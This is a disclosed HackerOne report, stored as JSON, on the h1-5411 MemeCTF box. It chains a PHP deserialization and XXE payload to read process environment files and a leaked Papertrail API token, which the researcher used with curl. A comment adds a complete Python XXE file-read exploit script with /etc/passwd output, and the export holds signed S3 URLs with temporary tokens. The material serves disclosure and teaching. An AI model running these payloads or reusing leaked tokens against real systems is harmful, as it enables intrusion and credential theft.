@@ -1,0 +1,432 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2018-10-22T17:55:15.261Z", 
+    "voters": [
+        "foobar7", 
+        "spam404", 
+        "0xacb", 
+        "eveeez", 
+        "mygf", 
+        "japz", 
+        "rebel_2808", 
+        "spetr0x", 
+        "iheb_hamad", 
+        "sameerphad72", 
+        "and 2 more..."
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": false, 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 416123, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": "2018-10-22T20:38:44.619Z", 
+    "vulnerability_information": "Hi there dear CTF staff!\n\nFirst of all a huge thank you for the great challenge you put up! I've found it super exciting and the learning curve has been steep.\n\nFor this case, I was first wondering if this is a part of the actual CTF, but after some inspecting, it surely doesn't seem so! I did even reach out to you via Twitter for initial confirmation.\n\n{F352815}\n\n\nThe Case\n=====================\n\nDuring some serious Meme generation and attempting on the CTF, I managed to reach a situation where I was able to read files from the local filesystem via XXE. After some poking around on the filesystem I was able to determin the Apache2 process id by chaining file discoveries:\n-> /etc/apache2/apache2.conf\n-> /etc/apache2/envvars\n-> /var/run/apache2$SUFFIX/apache2.pid, (Notes: $SUFFIX = \"\" and the file contains \"10\")\n-> /proc/10/environ\n\nWhich contains the environment data for Apache2 as (redacted for your good!):\n\n```\nHEROKU_EXEC_URL=https://exec-manager.heroku.com/ea0bc596-REDACTED\nPHP_EXTRA_CONFIGURE_ARGS=--with-apxs2 --disable-cgi\nAPACHE_CONFDIR=/etc/apache2\nPHP_INI_DIR=/usr/local/etc/php\nSHLVL=1\nPHP_EXTRA_BUILD_DEPS=apache2-dev\nPORT=58345\nPHP_LDFLAGS=-Wl,-O1 -Wl,--hash-style=both -pie\nAPACHE_RUN_DIR=/var/run/apache2\nPHP_CFLAGS=-fstack-protector-strong -fpic -fpie -O2\nPHP_MD5=\nPHP_VERSION=7.2.10\nAPACHE_PID_FILE=/var/run/apache2/apache2.pid\nGPG_KEYS=1729F83938-REDACTED B1B44D8F021E-REDACTED\nPHP_ASC_URL=https://secure.php.net/get/php-7.2.10.tar.xz.asc/from/this/mirror\nPHP_CPPFLAGS=-fstack-protector-strong -fpic -fpie -O2\n_=/usr/sbin/apache2ctl\nPHP_URL=https://secure.php.net/get/php-7.2.10.tar.xz/from/this/mirror\nPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\nPAPERTRAIL_API_TOKEN=ii6r9Ze-REDACTED\nAPACHE_LOCK_DIR=/var/lock/apache2\nLANG=C\nAPACHE_RUN_USER=www-data\nAPACHE_RUN_GROUP=www-data\nAPACHE_LOG_DIR=/var/log/apache2\nPHPIZE_DEPS=autoconf \t\tdpkg-dev \t\tfile \t\tg++ \t\tgcc \t\tlibc-dev \t\tmake \t\tpkg-config \t\tre2c\nPWD=/app\nPHP_SHA256=01c2154a3a8e3c0818acbdbc1a956832c828a0380ce6d1d14fea495ea21804f0\nAPACHE_ENVVARS=/etc/apache2/envvars\nDYNO=web.1\n```\n\nWhat caught my eye were Papertrail API-token and GPG-keypair. Also Heroku Exec url is present.\n\n{F352822}\n\nSo, as the ideas of this actually being a part of the CTF fading away and having nice previous record of finding and utilizing API-keys, I decided to test the Papertrail token for myself. And how about it? Works!\n\nAfter some poking around I landed on this:\n\n```\ncurl -i -H \"X-Papertrail-Token: ii6r9Ze-REDACTED\" https://papertrailapp.com/api/v1/events/search.json?system_id=23562-REDACTED\nHTTP/1.1 200 OK\nDate: Sat, 29 Sep 2018 11:29:58 GMT\nStrict-Transport-Security: max-age=31536000\nX-Frame-Options: SAMEORIGIN\nX-Rate-Limit-Limit: 25\nX-Rate-Limit-Remaining: 24\nX-Rate-Limit-Reset: 2\nX-Shibboleet: if you see this, we'd like to get you a thank you espresso\nX-Runtime: 440\nETag: \"6fa205988ad388afc-REDACTED\"\nCache-Control: private, max-age=0, must-revalidate\nContent-Length: 636600\nStatus: 200 OK\nContent-Type: application/json; charset=utf-8\n\n{\n\t\"min_id\": \"98264920-REDACTED\",\n\t\"max_id\": \"9826557-REDACTED\",\n\t\"events\": [{\n\t\t\t\"id\": \"9826492-REDACTED\",\n\t\t\t\"source_ip\": \"54.205.-REDACTED\",\n\t\t\t\"program\": \"heroku/router\",\n\t\t\t\"message\": \"at=info method=GET path=\\\"/vendor/font-awesome/css/font-awesome.min.css\\\" host=h1-5411.h1ctf.com request_id=5fb495c5-7237-455b-b79d--REDACTED fwd=\\\"192.130.-REDACTED\\\" dyno=web.1 connect=0ms service=3ms status=200 bytes=7354 protocol=https \",\n\t\t\t\"received_at\": \"2018-09-29T04:04:09-07:00\",\n\t\t\t\"generated_at\": \"2018-09-29T04:04:09-07:00\",\n\t\t\t\"display_received_at\": \"Sep 29 04:04:09\",\n\t\t\t\"source_id\": 23562-REDACTED,\n\t\t\t\"source_name\": \"h1-5411-2018-ctf\",\n\t\t\t\"hostname\": \"h1-5411-2018-ctf\",\n\t\t\t\"severity\": \"Info\",\n\t\t\t\"facility\": \"Local3\"\n\t\t}, {\n\t\t\t\"id\": \"982649204-REDACTED\",\n\t\t\t\"source_ip\": \"50.19.-REDACTED\",\n\t\t\t\"program\": \"heroku/router\",\n\t\t\t\"message\": \"at=info method=GET path=\\\"/vendor/jquery-easing/jquery.easing.min.js\\\" host=h1-5411.h1ctf.com request_id=8d7e3947-cba9-4661-a34c-1b385021600c fwd=\\\"192.130.-REDACTED\\\" dyno=web.1 connect=1ms service=2ms status=200 bytes=1130 protocol=https \",\n\t\t\t\"received_at\": \"2018-09-29T04:04:09-07:00\",\n\t\t\t\"generated_at\": \"2018-09-29T04:04:09-07:00\",\n\t\t\t\"display_received_at\": \"Sep 29 04:04:09\",\n\t\t\t\"source_id\": 23562-REDACTED,\n\t\t\t\"source_name\": \"h1-5411-2018-ctf\",\n\t\t\t\"hostname\": \"h1-5411-2018-ctf\",\n\t\t\t\"severity\": \"Info\",\n\t\t\t\"facility\": \"Local3\"\n\t\t},\n........ And so on.\n```\n\nAnd this particular header caught my eye:\n\n```\nX-Shibboleet: if you see this, we'd like to get you a thank you espresso\n```\n\nSo here I am, writing a report about this.\n\nSteps to reproduce\n=====================\nA good report almost always requires steps to reproduce. My apologies if this is something stupid and the read could be done more elegantly! I'll also skip the first parts of the challenge, since they're not neede to reproduce.\n\n1. Prepare the following serialized PHP-object  with a XXE payloadfor injection\n```\na:2:{i:0;s:93:\"../data/memes/1538175596-8bc89487fb699b9a757aaeec7cc4f19bdcfcb436cdbeac3389f8a91908721f17.txt\";i:1;O:10:\"ConfigFile\":1:{s:10:\"config_raw\";s:276:\"<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM 'php://filter/convert.base64-encode/resource=file:///proc/10/environ'>]><meme><toptext>qwerty</toptext><bottomtext>asdasd</bottomtext><template>&xxe;</template><type>TEXT</type></meme>\";}}\n```\n\nwhich is the following base64-string\n\n```\nYToyOntpOjA7czo5MzoiLi4vZGF0YS9tZW1lcy8xNTM4MTc1NTk2LThiYzg5NDg3ZmI2OTliOWE3NTdhYWVlYzdjYzRmMTliZGNmY2I0MzZjZGJlYWMzMzg5ZjhhOTE5MDg3MjFmMTcudHh0IjtpOjE7TzoxMDoiQ29uZmlnRmlsZSI6MTp7czoxMDoiY29uZmlnX3JhdyI7czoyNzY6Ijw/eG1sIHZlcnNpb249IjEuMCIgZW5jb2Rpbmc9IlVURi04Ij8+PCFET0NUWVBFIGZvbyBbPCFFTEVNRU5UIGZvbyBBTlkgPjwhRU5USVRZIHh4ZSBTWVNURU0gJ3BocDovL2ZpbHRlci9jb252ZXJ0LmJhc2U2NC1lbmNvZGUvcmVzb3VyY2U9ZmlsZTovLy9wcm9jLzEwL2Vudmlyb24nPl0+PG1lbWU+PHRvcHRleHQ+cXdlcnR5PC90b3B0ZXh0Pjxib3R0b210ZXh0PmFzZGFzZDwvYm90dG9tdGV4dD48dGVtcGxhdGU+Jnh4ZTs8L3RlbXBsYXRlPjx0eXBlPlRFWFQ8L3R5cGU+PC9tZW1lPiI7fX0=\n```\nand save it as \"memes.memepack\" -file\n\n2. Navigate to https://h1-5411.h1ctf.com/import_memes_2.0.php\n3. Click \"Choose file\" and open the newly created \"memes.memepack\"-file\n4. Open browser developer console or log requests with a proxy\n5. Click \"Import\"\n6. Inspect developer console or proxy, which should look similar to\n{F352830}\n7. Base64-decode parameter \"Template Location\" after \"=>\", which contains the file /proc/10/environ -file\n8. Profit! \n9. Get the Papertrail API-token\n10. Prepare Curl for example as following\n ```\ncurl -i -H \"X-Papertrail-Token: [INSERT PAPERTRAIL API-TOKEN HERE]\"  https://papertrailapp.com/api/v1/events/search.json?q=error\n```\n\n11. Inspect that response headers look similar to this:\n```\ncurl -i -H \"X-Papertrail-Token: ii6r9Ze-REDACTED\" https://papertrailapp.com/api/v1/events/search.json?q=error\nHTTP/1.1 200 OK\nDate: Sat, 29 Sep 2018 13:08:00 GMT\nStrict-Transport-Security: max-age=31536000\nX-Frame-Options: SAMEORIGIN\nX-Rate-Limit-Limit: 25\nX-Rate-Limit-Remaining: 24\nX-Rate-Limit-Reset: 5\nX-Shibboleet: if you see this, we'd like to get you a thank you espresso\nX-Runtime: 528\nETag: \"7207607ce216ca0fc-REDACTEDc\"\nCache-Control: private, max-age=0, must-revalidate\nContent-Length: 498309\nStatus: 200 OK\nContent-Type: application/json; charset=utf-8\n```\n12. Double profit!\n\n## Impact\n\nThe main impact of this vulnerability seems to be this!\n```\nX-Shibboleet: if you see this, we'd like to get you a thank you espresso\n```\n\nHowever, a malicious individual would propably harvest hacker IP-addresses and see what the other CTF contestants are doing on the box using the Papertrail token. Also GPG-keys should be kept private, as Heroku Exec manager-links.\n\n{F352838}", 
+    "activity_page_count": 1, 
+    "severity": {
+        "rating": "high", 
+        "author_type": "User"
+    }, 
+    "title": "MemeCTF serial exploitation to local file read to Papertrail access via API-token leakage and more", 
+    "is_member_of_team?": null, 
+    "vote_count": 12, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_create?": false, 
+            "can_view?": true
+        }
+    ], 
+    "structured_scope": null, 
+    "allow_singular_disclosure_at": "2018-11-21T17:55:15.916Z", 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "attachments": [
+        {
+            "file_name": "twitter.png", 
+            "type": "image/png", 
+            "id": 352815, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/815/384eb4d5d8b6fa744f8063b35f2cb3e5f3990263/twitter.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2SVVFJ4K%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221518Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA4aDHbUi43kCnkCH8ghLCK3A1d0D7VWgJRDZWkdXXQGdmf7n%2FMcJt3uTEwb6Hdinq%2BFBbOAPOTsDxxrJ44I1M0GsX5wZenJPL8PevI%2FkbL9IqT6R%2BJKEKlPqPM6LpUT14hZkERpNFrQjbQc8QQ%2BGLJrYv6NGh3Ip0gK9gXfS%2BBt4RVWsZtku7hv1GxjVLrVN4tDuBx9kVUepW9naK5%2F0oXZzGIIp6Gjh%2FIKSsk58VEBKjC8XaVYCB%2BOEny5LgjoqjGxQtdacfYhOkVvkddEIug%2BxqJX03QrdlzYBPmNTl%2FPYt%2B7Ia6XenfHJpLptcsNwDKANRyeTTV%2FG3g%2BOCXLUeY4exATzHTwdvoYqOvrt5wMz9qaQRoRKK%2BUjVv5ctpYJvTH%2FMcrqKT%2Bat0Vu5%2B29B4mQPTT0FWbwQNEZv9s2WUcZfFK4nwDe%2FbWVaTYUyESNo3P9MBzjTGlE3RUSHfTIaws9cxbq%2B26X0Us8FyKWbfQU0Wz7XFi79Hu7vzT0q43xcUGempz37db7hbAD8s5J3Yuqly6EYzpKQo3hgzH0paY8Y8q0cEeQcN483KhHSXRw2GkwLMg8vEagxezp9Qvun6sYzBWVKsCvy4ohp2m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=b896c7df76295863922164e76bbd066beccd12308458bd2444d6235d53fba0a7"
+        }, 
+        {
+            "file_name": "1538224862-ed7a521beddb5ae8959112892d9e8fbed353c27b24dcc98bb05b44579841cf8a.jpg", 
+            "type": "image/jpeg", 
+            "id": 352822, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/822/cd7ea1c07410de16832a84ec7c15c01729cabffa/1538224862-ed7a521beddb5ae8959112892d9e8fbed353c27b24dcc98bb05b44579841cf8a.jpg?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2SVVFJ4K%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221518Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA4aDHbUi43kCnkCH8ghLCK3A1d0D7VWgJRDZWkdXXQGdmf7n%2FMcJt3uTEwb6Hdinq%2BFBbOAPOTsDxxrJ44I1M0GsX5wZenJPL8PevI%2FkbL9IqT6R%2BJKEKlPqPM6LpUT14hZkERpNFrQjbQc8QQ%2BGLJrYv6NGh3Ip0gK9gXfS%2BBt4RVWsZtku7hv1GxjVLrVN4tDuBx9kVUepW9naK5%2F0oXZzGIIp6Gjh%2FIKSsk58VEBKjC8XaVYCB%2BOEny5LgjoqjGxQtdacfYhOkVvkddEIug%2BxqJX03QrdlzYBPmNTl%2FPYt%2B7Ia6XenfHJpLptcsNwDKANRyeTTV%2FG3g%2BOCXLUeY4exATzHTwdvoYqOvrt5wMz9qaQRoRKK%2BUjVv5ctpYJvTH%2FMcrqKT%2Bat0Vu5%2B29B4mQPTT0FWbwQNEZv9s2WUcZfFK4nwDe%2FbWVaTYUyESNo3P9MBzjTGlE3RUSHfTIaws9cxbq%2B26X0Us8FyKWbfQU0Wz7XFi79Hu7vzT0q43xcUGempz37db7hbAD8s5J3Yuqly6EYzpKQo3hgzH0paY8Y8q0cEeQcN483KhHSXRw2GkwLMg8vEagxezp9Qvun6sYzBWVKsCvy4ohp2m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=771470716ca7af257ecd507914fa094a3e372d2951014a8818cee9ce7d60fbab"
+        }, 
+        {
+            "file_name": "dev_console.png", 
+            "type": "image/png", 
+            "id": 352830, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/830/99dcff6792468267bacde2d58dcd905fcb955253/dev_console.png?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2SVVFJ4K%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221518Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA4aDHbUi43kCnkCH8ghLCK3A1d0D7VWgJRDZWkdXXQGdmf7n%2FMcJt3uTEwb6Hdinq%2BFBbOAPOTsDxxrJ44I1M0GsX5wZenJPL8PevI%2FkbL9IqT6R%2BJKEKlPqPM6LpUT14hZkERpNFrQjbQc8QQ%2BGLJrYv6NGh3Ip0gK9gXfS%2BBt4RVWsZtku7hv1GxjVLrVN4tDuBx9kVUepW9naK5%2F0oXZzGIIp6Gjh%2FIKSsk58VEBKjC8XaVYCB%2BOEny5LgjoqjGxQtdacfYhOkVvkddEIug%2BxqJX03QrdlzYBPmNTl%2FPYt%2B7Ia6XenfHJpLptcsNwDKANRyeTTV%2FG3g%2BOCXLUeY4exATzHTwdvoYqOvrt5wMz9qaQRoRKK%2BUjVv5ctpYJvTH%2FMcrqKT%2Bat0Vu5%2B29B4mQPTT0FWbwQNEZv9s2WUcZfFK4nwDe%2FbWVaTYUyESNo3P9MBzjTGlE3RUSHfTIaws9cxbq%2B26X0Us8FyKWbfQU0Wz7XFi79Hu7vzT0q43xcUGempz37db7hbAD8s5J3Yuqly6EYzpKQo3hgzH0paY8Y8q0cEeQcN483KhHSXRw2GkwLMg8vEagxezp9Qvun6sYzBWVKsCvy4ohp2m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=ff23330c87fa3d0ae738ea3d88465308f64c298c597626281a4db14b2e522491"
+        }, 
+        {
+            "file_name": "1538226989-aa272ee33507aab1dba96f176f01386a123ff2c0b03778db7423484d0d6c8de3.jpg", 
+            "type": "image/jpeg", 
+            "id": 352838, 
+            "expiring_url": "https://hackerone-us-west-2-production-attachments.s3-us-west-2.amazonaws.com/000/352/838/b367ed2c94403b818e15e84af065cda89e5c5759/1538226989-aa272ee33507aab1dba96f176f01386a123ff2c0b03778db7423484d0d6c8de3.jpg?X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ2SVVFJ4K%2F20181206%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20181206T221518Z&X-Amz-Expires=3600&X-Amz-Security-Token=FQoGZXIvYXdzEA4aDHbUi43kCnkCH8ghLCK3A1d0D7VWgJRDZWkdXXQGdmf7n%2FMcJt3uTEwb6Hdinq%2BFBbOAPOTsDxxrJ44I1M0GsX5wZenJPL8PevI%2FkbL9IqT6R%2BJKEKlPqPM6LpUT14hZkERpNFrQjbQc8QQ%2BGLJrYv6NGh3Ip0gK9gXfS%2BBt4RVWsZtku7hv1GxjVLrVN4tDuBx9kVUepW9naK5%2F0oXZzGIIp6Gjh%2FIKSsk58VEBKjC8XaVYCB%2BOEny5LgjoqjGxQtdacfYhOkVvkddEIug%2BxqJX03QrdlzYBPmNTl%2FPYt%2B7Ia6XenfHJpLptcsNwDKANRyeTTV%2FG3g%2BOCXLUeY4exATzHTwdvoYqOvrt5wMz9qaQRoRKK%2BUjVv5ctpYJvTH%2FMcrqKT%2Bat0Vu5%2B29B4mQPTT0FWbwQNEZv9s2WUcZfFK4nwDe%2FbWVaTYUyESNo3P9MBzjTGlE3RUSHfTIaws9cxbq%2B26X0Us8FyKWbfQU0Wz7XFi79Hu7vzT0q43xcUGempz37db7hbAD8s5J3Yuqly6EYzpKQo3hgzH0paY8Y8q0cEeQcN483KhHSXRw2GkwLMg8vEagxezp9Qvun6sYzBWVKsCvy4ohp2m4AU%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=efe7396aee986ad9c8185f9399774b0a7ac597651827790fe7b98ba48aa7ab24"
+        }
+    ], 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "created_at": "2018-09-30T13:15:22.220Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2018-09-30T13:23:11.243Z", 
+            "actor": {
+                "username": "osintopsec", 
+                "url": "/osintopsec", 
+                "profile_picture_urls": {
+                    "medium": "/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "h1-5411-ctf", 
+            "message": "Because we're different kind of animals and in case this ever gets disclosed, there should be something for others to learn from this. Let's make it this time a lesson about automation. Initial proof-of-concept should be manually doable, but if you're going to make more than 10 requests yourself, the process should be automated to some extent.\n\n### Automation\nHere's a quick python script to exploit the XXE to read files from the server:\n\n```\n# Hackerone 5411 MemeCTF XXE to read server files exploit\nimport requests\nimport time\nimport sys\nimport base64\n\n# Init\nif sys.argv[1] == \"-h\" or sys.argv[1] == \"--help\":\n    print \"### XAT by Opsec ###\"\n    print \"Read local files on Hackerone 5411 CTF box using XXE vulnerability\"\n    print \"Usage: python xat.py [path-to-file, string]\"\n    print \"-h, --help    Print this info\"\n    sys.exit()\nelse:\n    file_to_cat = sys.argv[1]\n    print \"Looking for %s\" % file_to_cat\n\n# Endpoints\nbase_url = 'https://h1-5411.h1ctf.com/'\nmemes_url = 'memes.php'\nimport_url = 'api/import_memes_2.0.php'\n\n# Get session cookie\nprint \"Getting session cookie\"\nr = requests.head(base_url + memes_url)\ncookie = r.headers['Set-Cookie'].split(';')[0]\n# Import payload\nprint \"Generating payload\"\npayload = '<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM \\'php://filter/convert.base64-encode/resource=file:///%s\\'>]><meme><toptext>q</toptext><bottomtext>a</bottomtext><template>&xxe;</template><type>TEXT</type></meme>' % file_to_cat\nphp_object = 'a:2:{i:0;s:15:\"../css/grid.css\";i:1;O:10:\"ConfigFile\":1:{s:10:\"config_raw\";s:%s:\"%s\";}}' % (len(payload), payload)\nmemepak = {'f': ('memes.memepak', base64.b64encode(php_object), 'application/octet-stream')}\n\n# Make XXE-request\nset_headers = {\n    'Cookie': cookie\n    }\nprint \"Sending payload\"\nr = requests.post(base_url + import_url,\n                headers = set_headers,\n                files = memepak)\n# Make sure that the server is ready with imported data, 3 sec should be enough\nprint \"Sleep 3\"\ntime.sleep(3)\n\n# Request XXE-content\nprint \"Requesting exploit data\"\nr = requests.get(base_url + memes_url,\n                headers = set_headers)\n\n# Check response for exploit data\nexploit_data = \"\"\nfor line in r.text.splitlines():\n    if 'Template Location =&gt; ' in line:\n        exploit_data = line.split('Template Location =&gt; ')[1]\n        break\n\nif len(exploit_data) > 0:\n    exploit_product = base64.b64decode(exploit_data)\n    print \"Exploit product:\\r\\n\"\n    print exploit_product\nelse:\n    print \"No exploit product! File doesn't exist, is empty or user www-data has no permission for it.\"\n```\n\nWhich in use produces output like this:\n\n```\n>python xat.py /etc/passwd\nLooking for /etc/passwd\nGetting session cookie\nGenerating payload\nSending payload\nSleep 3\nRequesting exploit data\nExploit product:\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\nbin:x:2:2:bin:/bin:/bin/sh\nsys:x:3:3:sys:/dev:/bin/sh\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/bin/sh\nman:x:6:12:man:/var/cache/man:/bin/sh\nlp:x:7:7:lp:/var/spool/lpd:/bin/sh\nmail:x:8:8:mail:/var/mail:/bin/sh\nnews:x:9:9:news:/var/spool/news:/bin/sh\nuucp:x:10:10:uucp:/var/spool/uucp:/bin/sh\nproxy:x:13:13:proxy:/bin:/bin/sh\nwww-data:x:33:33:www-data:/var/www:/bin/sh\nbackup:x:34:34:backup:/var/backups:/bin/sh\nlist:x:38:38:Mailing List Manager:/var/list:/bin/sh\nirc:x:39:39:ircd:/var/run/ircd:/bin/sh\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh\nnobody:x:65534:65534:nobody:/nonexistent:/bin/sh\nu22458:x:22458:22458:,,,:/app:/bin/bash\ndyno:x:22458:22458:,,,:/app:/bin/bash\n```\n\nA quick script for automating the file discovery speeds up the research process a lot. Also writing exploits is a good way to actually understand what you're dealing with and how it should be treated. And if you're lacking something to do, you can always make them better, for e.g. make them save the output etc.\n\n### PHP Filters\n\nAnother point I want to bring to attention is the usage of PHP filters to exfil the data from the server. In many cases the XXE exfil fails due to encoding or character related problems. During the CTF I noticed many of the participants saying they were able to perform XXE, but thought it was \"blind\" because they were unable to exfil the data.\n\nWith usage of PHP filter, you don't have to think about the encodings or characters involved in the file, as they get encoded to base64 which on the other hand can be regarded as HTTP safe.\n```\nphp://filter/convert.base64-encode/resource=file:///%s\n``` \nCheck the payload in the initial report or in the script!", 
+            "markdown_message": "<p>Because we&#39;re different kind of animals and in case this ever gets disclosed, there should be something for others to learn from this. Let&#39;s make it this time a lesson about automation. Initial proof-of-concept should be manually doable, but if you&#39;re going to make more than 10 requests yourself, the process should be automated to some extent.</p>\n\n<h3 id=\"automation\">Automation</h3>\n\n<p>Here&#39;s a quick python script to exploit the XXE to read files from the server:</p>\n<pre class=\"highlight plaintext\"><code># Hackerone 5411 MemeCTF XXE to read server files exploit\nimport requests\nimport time\nimport sys\nimport base64\n\n# Init\nif sys.argv[1] == &quot;-h&quot; or sys.argv[1] == &quot;--help&quot;:\n    print &quot;### XAT by Opsec ###&quot;\n    print &quot;Read local files on Hackerone 5411 CTF box using XXE vulnerability&quot;\n    print &quot;Usage: python xat.py [path-to-file, string]&quot;\n    print &quot;-h, --help    Print this info&quot;\n    sys.exit()\nelse:\n    file_to_cat = sys.argv[1]\n    print &quot;Looking for %s&quot; % file_to_cat\n\n# Endpoints\nbase_url = &#39;https://h1-5411.h1ctf.com/&#39;\nmemes_url = &#39;memes.php&#39;\nimport_url = &#39;api/import_memes_2.0.php&#39;\n\n# Get session cookie\nprint &quot;Getting session cookie&quot;\nr = requests.head(base_url + memes_url)\ncookie = r.headers[&#39;Set-Cookie&#39;].split(&#39;;&#39;)[0]\n# Import payload\nprint &quot;Generating payload&quot;\npayload = &#39;&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;&lt;!DOCTYPE foo [&lt;!ELEMENT foo ANY &gt;&lt;!ENTITY xxe SYSTEM \\&#39;php://filter/convert.base64-encode/resource=file:///%s\\&#39;&gt;]&gt;&lt;meme&gt;&lt;toptext&gt;q&lt;/toptext&gt;&lt;bottomtext&gt;a&lt;/bottomtext&gt;&lt;template&gt;&amp;xxe;&lt;/template&gt;&lt;type&gt;TEXT&lt;/type&gt;&lt;/meme&gt;&#39; % file_to_cat\nphp_object = &#39;a:2:{i:0;s:15:&quot;../css/grid.css&quot;;i:1;O:10:&quot;ConfigFile&quot;:1:{s:10:&quot;config_raw&quot;;s:%s:&quot;%s&quot;;}}&#39; % (len(payload), payload)\nmemepak = {&#39;f&#39;: (&#39;memes.memepak&#39;, base64.b64encode(php_object), &#39;application/octet-stream&#39;)}\n\n# Make XXE-request\nset_headers = {\n    &#39;Cookie&#39;: cookie\n    }\nprint &quot;Sending payload&quot;\nr = requests.post(base_url + import_url,\n                headers = set_headers,\n                files = memepak)\n# Make sure that the server is ready with imported data, 3 sec should be enough\nprint &quot;Sleep 3&quot;\ntime.sleep(3)\n\n# Request XXE-content\nprint &quot;Requesting exploit data&quot;\nr = requests.get(base_url + memes_url,\n                headers = set_headers)\n\n# Check response for exploit data\nexploit_data = &quot;&quot;\nfor line in r.text.splitlines():\n    if &#39;Template Location =&amp;gt; &#39; in line:\n        exploit_data = line.split(&#39;Template Location =&amp;gt; &#39;)[1]\n        break\n\nif len(exploit_data) &gt; 0:\n    exploit_product = base64.b64decode(exploit_data)\n    print &quot;Exploit product:\\r\\n&quot;\n    print exploit_product\nelse:\n    print &quot;No exploit product! File doesn&#39;t exist, is empty or user www-data has no permission for it.&quot;\n</code></pre>\n<p>Which in use produces output like this:</p>\n<pre class=\"highlight plaintext\"><code>&gt;python xat.py /etc/passwd\nLooking for /etc/passwd\nGetting session cookie\nGenerating payload\nSending payload\nSleep 3\nRequesting exploit data\nExploit product:\n\nroot:x:0:0:root:/root:/bin/bash\ndaemon:x:1:1:daemon:/usr/sbin:/bin/sh\nbin:x:2:2:bin:/bin:/bin/sh\nsys:x:3:3:sys:/dev:/bin/sh\nsync:x:4:65534:sync:/bin:/bin/sync\ngames:x:5:60:games:/usr/games:/bin/sh\nman:x:6:12:man:/var/cache/man:/bin/sh\nlp:x:7:7:lp:/var/spool/lpd:/bin/sh\nmail:x:8:8:mail:/var/mail:/bin/sh\nnews:x:9:9:news:/var/spool/news:/bin/sh\nuucp:x:10:10:uucp:/var/spool/uucp:/bin/sh\nproxy:x:13:13:proxy:/bin:/bin/sh\nwww-data:x:33:33:www-data:/var/www:/bin/sh\nbackup:x:34:34:backup:/var/backups:/bin/sh\nlist:x:38:38:Mailing List Manager:/var/list:/bin/sh\nirc:x:39:39:ircd:/var/run/ircd:/bin/sh\ngnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh\nnobody:x:65534:65534:nobody:/nonexistent:/bin/sh\nu22458:x:22458:22458:,,,:/app:/bin/bash\ndyno:x:22458:22458:,,,:/app:/bin/bash\n</code></pre>\n<p>A quick script for automating the file discovery speeds up the research process a lot. Also writing exploits is a good way to actually understand what you&#39;re dealing with and how it should be treated. And if you&#39;re lacking something to do, you can always make them better, for e.g. make them save the output etc.</p>\n\n<h3 id=\"php-filters\">PHP Filters</h3>\n\n<p>Another point I want to bring to attention is the 